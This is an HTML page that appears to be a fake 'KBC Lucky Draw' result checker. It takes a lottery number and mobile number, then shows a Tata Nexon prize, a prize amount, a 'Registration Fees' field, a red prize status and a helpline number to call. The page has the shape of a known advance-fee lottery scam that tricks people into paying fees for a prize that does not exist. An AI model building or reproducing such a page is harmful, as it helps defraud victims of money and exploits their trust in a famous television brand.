<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
  <title>Kaun Banega Crorepati Result</title>
  <link rel="icon" type="image/jpg" href="favicon.jpg">
</head>
<body>
  
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap')
  </style>
  
  <center><h1><u>KBC LUCKY DRAW</u></h1></center>
  <div class="container">
      <u><div id="heading" style="font-size: 28px; font-weight: 700; margin-bottom: 15px;">CHECK RESULT</div></u>
    <form id="loginForm">
      <label for="lotteryNumber">Lottery Number:</label>
      <input type="number" id="lotteryNumber" required><br>
      <label for="mobileNumber">Mobile Number:</label>
      <input type="number" id="mobileNumber" required><br>
      <button type="submit" style="box-shadow: 3px 3px 7px rgba(0, 0, 0, 0.5)">SUBMIT</button><br><br>
    </form>
    
    <span id="loginMessage" style="font-size: 16px; padding: 5px 15px; border-radius: 5px; color: #fff;"></span>
    
    <div id="detailsContainer" class="hidden" style="font-size: 18px;">
      <p>Name: <span id="name" style="text-transform: capitalize;"></span></p>
      <p>Prize Name: Tata Nexon</p>
      <p>Prize Amount: <span id="winningAmount"></span></p>
      <p>Lottery Number: <span id="displayLotteryNumber"></span></p>
      <p>Mobile No.: <span id="displayMobileNumber"></span></p>
      <p>Registration Fees: <span id="fees"></span></p>
      <p>Prize Status: <span id="prizeStatus" style="color: red;"></span></p>
      <img src="car.jpeg" style="width: 280px; border-radius: 5px; pointer-events: none;">
      <p style="font-size: 14px">*For Any Questions or Concerns, You Can Call Helpline No. +91 9951431206</p>
      <a href="tel:+919951431206" style="padding: 10px 15px; background: #00c04b; text-decoration: none; color: #fff; border-radius: 5px; box-shadow: 3px 3px 7px rgba(0, 0, 0, 0.5)">CALL NOW</a>

    </div>
  </div>

<script src="main.js"></script>
</body>
</html>
